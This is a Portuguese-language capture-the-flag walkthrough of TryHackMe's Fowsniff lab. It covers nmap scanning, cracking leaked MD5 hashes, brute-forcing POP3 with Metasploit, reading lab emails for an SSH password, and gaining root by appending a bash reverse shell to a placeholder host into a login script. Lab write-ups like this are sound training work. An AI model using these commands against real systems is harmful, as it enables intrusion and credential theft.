# Fowsniff CTF — TryHackMe

## 📌 Informações

| Campo | Detalhe |
|---|---|
| Plataforma | TryHackMe |
| Dificuldade | Fácil |
| OS | Linux |
| Tags | OSINT, Brute Force, POP3, SSH, Privilege Escalation |

---

## 🔍 1. Reconhecimento

Inicio o scan com Nmap:

```bash
nmap -sC -sV -oN nmap.txt <IP>
```

**Resultado:**
- Porta 22 — SSH
- Porta 80 — HTTP (Apache)
- Porta 110 — POP3
- Porta 143 — IMAP

---

## 🌐 2. Enumeração Web

Acesso o site no navegador — página da empresa Fowsniff Corp com aviso de que foram hackeados.

Pesquisando o nome da empresa no Google encontro um dump de credenciais vazadas publicamente com usuários e hashes MD5.

---

## 🔓 3. Quebra dos Hashes

Com os hashes MD5 do dump, utilizo o CrackStation ou John the Ripper:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Credenciais recuperadas:
- `seina : scoobydoo2`
- Outras credenciais da lista

---

## 📬 4. Acesso ao POP3

Utilizo o Metasploit para brute force no serviço POP3:

```bash
use auxiliary/scanner/pop3/pop3_login
set RHOSTS <IP>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

Credencial válida encontrada: `seina : scoobydoo2`

Acesso manual ao POP3:

```bash
telnet <IP> 110
USER seina
PASS scoobydoo2
LIST
RETR 1
RETR 2
```

**Emails encontrados:**
- Email de A.J. Stone informando senha temporária de SSH: `S1ck3nBluff+secureshell`
- Informações sobre o servidor temporário

---

## 🔑 5. Acesso SSH

Com a senha encontrada no email:

```bash
ssh baksteen@<IP>
```

Senha: `S1ck3nBluff+secureshell`

Acesso obtido como usuário `baksteen` ✅

---

## ⬆️ 6. Escalação de Privilégios

Verifico grupos do usuário atual:

```bash
id
```

Usuário pertence ao grupo `users`. Procuro arquivos pertencentes a esse grupo:

```bash
find / -group users -type f 2>/dev/null
```

Encontro script executado no login:

```bash
/opt/cube/cube.sh
```

Edito o script inserindo reverse shell:

```bash
echo "bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1" >> /opt/cube/cube.sh
```

Abro listener:

```bash
nc -lvnp 4444
```

Faço login novamente via SSH para acionar o script e obtenho shell como root ✅

---

## 📝 Resumo

| Etapa | Técnica |
|---|---|
| Reconhecimento | Nmap + OSINT |
| Credenciais | Hash Cracking (MD5) |
| Acesso inicial | Brute Force POP3 + leitura de emails |
| Acesso SSH | Credencial encontrada em email |
| Root | Script de login com permissão de escrita |

---

## 🛠️ Ferramentas Utilizadas

- Nmap
- Metasploit (pop3_login)
- John the Ripper / CrackStation
- Telnet
- Netcat
